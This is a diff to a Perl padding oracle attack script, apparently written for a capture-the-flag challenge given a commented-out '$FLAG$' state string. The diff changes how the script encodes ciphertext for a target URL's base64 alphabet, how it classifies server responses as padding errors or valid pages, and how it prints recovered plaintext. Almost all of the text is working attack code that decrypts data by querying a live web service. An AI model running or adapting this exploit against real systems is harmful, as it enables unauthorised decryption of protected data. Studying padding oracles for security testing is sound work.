@@ -32,10 +32,10 @@ if ($config){
     $config->write($file);
 }
 
-#$parm =~ s/-/+/ig;
-#$parm =~ s/!/\//ig;
-#$parm =~ s/~/=/ig;
-$parm = uri_unescape($parm);
+$parm =~ s/-/+/ig;
+$parm =~ s/!/\//ig;
+$parm =~ s/~/=/ig;
+#$parm = uri_unescape($parm);
 $parm = decode_base64($parm);
 my $qLen = length($parm)-1;
 #
@@ -89,6 +89,14 @@ while ($ill < $AIM){
 }
 #
 
+#my $state = 'state=324b26c2eeeb51c3191d212e44ab4670083$FLAG$", "id": "2", "key": "yrIoJt1shYp3XUP87-9eRA~~"}';
+#my $sL = int(length($state)/16);
+#my $lolll = length($state)%16;
+#$qLen = $qLen-$bSize*$sL;
+#$parm = substr($parm,  0, $qLen+1); # Added 1 because it starts from 1 instead of 0.
+
+
+
 my $target = 0;
 my $bNum = ($qLen+1)/$bSize;
 print "\nInitial Padding Size = $AIM, Number of Blocks = $bNum\n\n";
@@ -127,8 +135,9 @@ while ($bt < $bNum){
     $AIM = 0;
     my @plainText = reverse(@text);
     foreach( @plainText ){
-        print chr($_);
+        if (chr($_) eq "\n"){ next; }else{ print chr($_); } # figure out why newlines are in the array
     } 
+    print "\n\n";
 }
 
 print "Attack Complete! Your plain text: \n";
@@ -150,12 +159,16 @@ sub prep { # Prep paddings (turns something like \x03\x03\x03 to \x04\x04\x04)
 }
 
 sub getRequest {
-    my $heel = uri_escape(encode_base64($_[0], ''));
+    #my $heel = uri_escape(encode_base64($_[0], ''));
+    my $heel = encode_base64($_[0], '');
+    $heel =~ s/\+/-/ig;
+    $heel =~ s/\//!/ig;
+    $heel =~ s/=/~/ig;
     my $response = HTTP::Tiny->new->get($url.$heel);
     my $htmlResponse = sha256_base64($response->{content});
-    if ( grep { $_ eq $htmlResponse } @paddingErrors ){
+    if ( grep {$response->{content} =~ $_ } @paddingErrors ){
         return 0;
-    }elsif( grep { $_ eq $htmlResponse } @guuud ){
+    }elsif( grep {$response->{content} =~ $_ } @guuud ){
         return 1;
     }else{
         my $uinput;
@@ -164,11 +177,14 @@ sub getRequest {
             chomp ($uinput = <STDIN>);
             $uinput = $uinput+0; # Make this better
             if ($uinput == 2){
-                push @guuud, $htmlResponse;
+                print "\nInput a keyword to identify the HTML page: ";
+                chomp (my $tempV = <STDIN>);
+                push @guuud, $tempV;
                 return 1;
             }elsif ($uinput == 1){
-                push @paddingErrors, $htmlResponse;
-                $uinput++; #horrible change this
+                print "\nInput a keyword to identify the padding error: ";
+                chomp (my $tempV = <STDIN>);
+                push @paddingErrors, $tempV;
                 return 0;
             }else{
                 print "\nPlease input either \"1\",  \"2\", or \"3\" (You typed: $uinput)\n\n";
